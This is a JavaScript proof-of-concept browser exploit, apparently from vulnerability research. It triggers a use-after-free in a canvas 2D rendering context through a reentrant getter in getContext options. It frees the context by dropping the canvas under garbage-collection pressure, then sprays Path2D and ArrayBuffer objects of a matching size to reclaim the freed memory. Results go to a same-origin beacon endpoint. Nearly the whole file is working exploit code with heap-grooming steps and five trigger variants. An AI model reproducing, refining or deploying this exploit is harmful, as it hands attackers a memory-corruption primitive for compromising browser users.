// p509 — Dual-wrapper second-order UAF (Portablelle Issue #11)
//
// Same-type UAF gives two JS wrappers (W1, W2) for one C++ context.
// Normally the context stays alive because the canvas holds a Ref<>.
// Second-order: drop the canvas → context ref drops → C++ context freed.
// W1 (created during reentrant getter) bypasses invalidation → genuine dangle.
// Spray Path2D (13 seg × 56B = 728B, FastMalloc) to reclaim freed ~712B slot.
// save() through W1 writes at slot+0x250 → detects reclaim.
//
// Three trigger variants:
//   T1: null canvas variable + GC pressure
//   T2: removeChild canvas from DOM + GC pressure
//   T3: replaceWith on canvas element + GC pressure
//
// Beacon prefix: V509-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V509-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // GC pressure: allocate and discard large arrays to force collection
  function gcPressure() {
    for (var i = 0; i < 200; i++) {
      var a = new ArrayBuffer(65536);
    }
  }

  // Build source Path2D: 13 segments → 728B buffer
  var srcPath = new Path2D();
  srcPath.moveTo(1.0, 2.0);
  for (var i = 1; i <= 12; i++) {
    srcPath.lineTo(i * 10.0, i * 20.0);
  }

  // ═══════════════════════════════════════════════════════════
  // Helper: trigger same-type UAF, return {w1, w2, canvas}
  // w1 = stale wrapper (created during reentrant getter)
  // w2 = outer wrapper (returned by second getContext call)
  // canvas = the HTMLCanvasElement holding the context alive
  // ═══════════════════════════════════════════════════════════
  function triggerSameTypeUAF(id) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);

    var w1 = null;
    var cc = 0;
    var s = {};
    Object.defineProperty(s, 'desynchronized', {
      get: function() {
        cc++;
        if (cc === 1) {
          w1 = c.getContext('2d');
        }
        return false;
      }
    });
    var w2 = c.getContext('2d', s);
    B(id + '-UAF', 'w1=' + !!w1 + ',w2=' + !!w2 + ',cc=' + cc + ',same=' + (w1 === w2));
    return { w1: w1, w2: w2, canvas: c };
  }

  // ═══════════════════════════════════════════════════════════
  // T1: null canvas variable + GC pressure
  // ═══════════════════════════════════════════════════════════
  // Hypothesis: if we null both the canvas var AND remove from DOM,
  // nothing roots the canvas → GC collects it → context ref drops → freed
  (function() {
    var r = triggerSameTypeUAF('T1');
    if (!r.w1) { B('T1-SKIP', 'no w1'); return; }

    // Verify w1 works before freeing
    var preOk = false;
    try { r.w1.save(); preOk = true; } catch(e) {}
    B('T1-PRE', 'save_ok=' + preOk);

    // Drop all references to canvas and w2
    var stale = r.w1; // keep only the stale wrapper
    r.canvas.parentNode.removeChild(r.canvas);
    r.w2 = null;
    r.canvas = null;
    r = null;

    // Heavy GC pressure
    gcPressure();
    gcPressure();
    gcPressure();

    // Spray Path2D to reclaim the freed slot
    var spray = [];
    for (var i = 0; i < 500; i++) {
      spray.push(new Path2D(srcPath));
    }
    B('T1-SPRAY', 'count=500');

    // Test: save() through stale wrapper
    var saveOk = false;
    try { stale.save(); saveOk = true; } catch(e) {
      B('T1-SAVE-ERR', e.name + ':' + e.message);
    }
    B('T1-SAVE', 'ok=' + saveOk);

    // Control: second save to verify increment
    if (saveOk) {
      var save2 = false;
      try { stale.save(); save2 = true; } catch(e) {}
      B('T1-SAVE2', 'ok=' + save2);
    }
  })();

  // ═══════════════════════════════════════════════════════════
  // T2: removeChild + null w2 + repeated GC
  // ═══════════════════════════════════════════════════════════
  // More aggressive: multiple GC rounds between drop and spray
  (function() {
    var r = triggerSameTypeUAF('T2');
    if (!r.w1) { B('T2-SKIP', 'no w1'); return; }

    var stale = r.w1;

    // Drop canvas from DOM
    if (r.canvas.parentNode) r.canvas.parentNode.removeChild(r.canvas);

    // Null all refs except stale
    r.w2 = null;
    r.canvas = null;
    r = null;

    // Multiple GC rounds with delay-like spacing
    for (var round = 0; round < 5; round++) {
      gcPressure();
      // Allocate and free different sizes to trigger different sweep passes
      var junk = [];
      for (var j = 0; j < 100; j++) {
        junk.push(new ArrayBuffer(728)); // same size class as target
      }
      junk = null;
    }
    B('T2-GC', 'rounds=5');

    // Spray Path2D
    var spray = [];
    for (var i = 0; i < 500; i++) {
      spray.push(new Path2D(srcPath));
    }
    B('T2-SPRAY', 'count=500');

    var saveOk = false;
    try { stale.save(); saveOk = true; } catch(e) {
      B('T2-SAVE-ERR', e.name + ':' + e.message);
    }
    B('T2-SAVE', 'ok=' + saveOk);
  })();

  // ═══════════════════════════════════════════════════════════
  // T3: replaceWith a div + GC
  // ═══════════════════════════════════════════════════════════
  // replaceWith removes the canvas AND replaces it, ensuring no stale DOM ref
  (function() {
    var r = triggerSameTypeUAF('T3');
    if (!r.w1) { B('T3-SKIP', 'no w1'); return; }

    var stale = r.w1;

    // Replace canvas with a plain div
    var div = document.createElement('div');
    try {
      r.canvas.replaceWith(div);
    } catch(e) {
      // fallback: just remove
      if (r.canvas.parentNode) r.canvas.parentNode.removeChild(r.canvas);
    }

    r.w2 = null;
    r.canvas = null;
    r = null;
    div = null;

    gcPressure();
    gcPressure();
    gcPressure();

    // Spray
    var spray = [];
    for (var i = 0; i < 500; i++) {
      spray.push(new Path2D(srcPath));
    }
    B('T3-SPRAY', 'count=500');

    var saveOk = false;
    try { stale.save(); saveOk = true; } catch(e) {
      B('T3-SAVE-ERR', e.name + ':' + e.message);
    }
    B('T3-SAVE', 'ok=' + saveOk);
  })();

  // ═══════════════════════════════════════════════════════════
  // T4: Control — same-type UAF WITHOUT dropping canvas (should always work)
  // ═══════════════════════════════════════════════════════════
  (function() {
    var r = triggerSameTypeUAF('T4');
    if (!r.w1) { B('T4-SKIP', 'no w1'); return; }

    // Don't drop canvas — context stays alive
    var saveOk = false;
    try { r.w1.save(); saveOk = true; } catch(e) {
      B('T4-SAVE-ERR', e.name + ':' + e.message);
    }
    B('T4-CONTROL', 'save_ok=' + saveOk + ' (expected=true, canvas alive)');
  })();

  // ═══════════════════════════════════════════════════════════
  // T5: Aggressive — drop canvas, spray 728B ABs too (comparison)
  // ═══════════════════════════════════════════════════════════
  (function() {
    var r = triggerSameTypeUAF('T5');
    if (!r.w1) { B('T5-SKIP', 'no w1'); return; }

    var stale = r.w1;
    if (r.canvas.parentNode) r.canvas.parentNode.removeChild(r.canvas);
    r.w2 = null;
    r.canvas = null;
    r = null;

    gcPressure();
    gcPressure();

    // Spray BOTH Path2D and AB (728B each)
    var p2dSpray = [];
    var abSpray = [];
    for (var i = 0; i < 300; i++) {
      p2dSpray.push(new Path2D(srcPath));
      abSpray.push(new ArrayBuffer(728));
    }
    B('T5-SPRAY', 'path2d=300,ab=300');

    var saveOk = false;
    try { stale.save(); saveOk = true; } catch(e) {
      B('T5-SAVE-ERR', e.name + ':' + e.message);
    }
    B('T5-SAVE', 'ok=' + saveOk);
  })();

  B('DONE', 'all tests complete');
})();
